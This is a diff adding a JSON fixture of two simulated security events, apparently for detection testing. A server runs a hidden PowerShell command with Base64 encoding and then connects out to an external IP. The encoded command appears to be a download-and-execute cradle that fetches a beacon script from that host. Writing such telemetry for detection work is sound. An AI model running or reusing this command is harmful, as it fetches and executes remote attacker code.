@@ -1,0 +1,30 @@
+[
+  {
+    "event_uid": "mal_c2_001",
+    "timestamp": "2026-09-30T10:42:19Z",
+    "source": { "hostname": "SERVER-04", "ip": "10.10.1.24", "type": "endpoint" },
+    "event_type": "process_execution",
+    "severity": "CRITICAL",
+    "user": "administrator",
+    "process": {
+      "name": "powershell.exe",
+      "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AYgBlAGEAYwBvAG4ALgBwAHMxIikA",
+      "pid": 4812
+    }
+  },
+  {
+    "event_uid": "mal_c2_002",
+    "timestamp": "2026-09-30T10:43:02Z",
+    "source": { "hostname": "SERVER-04", "ip": "10.10.1.24", "type": "network" },
+    "event_type": "network_connection",
+    "severity": "CRITICAL",
+    "user": "administrator",
+    "network": {
+      "source_ip": "10.10.1.24",
+      "source_port": 49182,
+      "destination_ip": "185.220.101.5",
+      "destination_port": 443,
+      "protocol": "TCP"
+    }
+  }
+]
